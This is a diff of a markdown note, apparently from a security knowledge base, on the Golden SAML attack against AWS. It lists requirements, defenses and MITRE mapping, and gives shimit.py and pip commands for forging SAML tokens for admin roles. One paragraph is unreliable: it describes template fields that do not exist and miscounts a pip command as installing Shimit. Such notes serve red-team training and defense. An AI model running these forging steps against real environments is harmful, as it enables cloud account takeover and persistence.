@@ -35,6 +35,8 @@ The Golden SAML attack is a technique that allows an attacker to create a forged
 
 This attack is useful for gaining access to sensitive cloud resources or for maintaining persistence within a victim's environment.
 
+ 
+
 ## Requirements
 
 1. Access to a victim's AWS environment
@@ -42,6 +44,8 @@ This attack is useful for gaining access to sensitive cloud resources or for mai
 1. Knowledge of the necessary information to create a forged SAML token
 
 1. Installation and configuration of Shimit
+
+ 
 
 ## Defense
 
@@ -51,11 +55,15 @@ This attack is useful for gaining access to sensitive cloud resources or for mai
 
 1. Regularly review and revoke unnecessary permissions for AWS roles and users
 
+ 
+
 ## Objectives
 
 1. Gain access to a victim's cloud resources
 
 1. Maintain persistence within a victim's environment
+
+ 
 
 # Instructions
 
@@ -70,9 +78,17 @@ $ python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file
 
 Replace the values for the parameters with the appropriate values for your environment.
 
+ 
+
+
+
 **Code**: [[$ python -m pip install boto3 botocore defusedxml ]]
 
+
+
 > This command installs and configures Shimit, a tool used for performing Golden SAML attacks. The 'data' field provides the command to install and configure Shimit. The 'text' field provides links to a YouTube video and a blog post that provide more information about Golden SAML attacks. The 'instruction' field provides step-by-step instructions on how to install and configure Shimit. The 'explain' field provides a brief explanation of what the command does.
+
+
 
 **Command** ([[Install Python packages boto3, botocore, defusedxml, enum, python_dateutil, lxml, signxml]]):
 
@@ -80,11 +96,17 @@ Replace the values for the parameters with the appropriate values for your envir
 $ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml
 ```
 
+
+
+
+
 **Command** ([[Run shimit.py script with required parameters]]):
 
 ```bash
 $ python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -109,3 +131,5 @@ $ python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file
 
 - [[AWS - Golden SAML Attack]]
 - [[Cloud - AWS]]
+
+
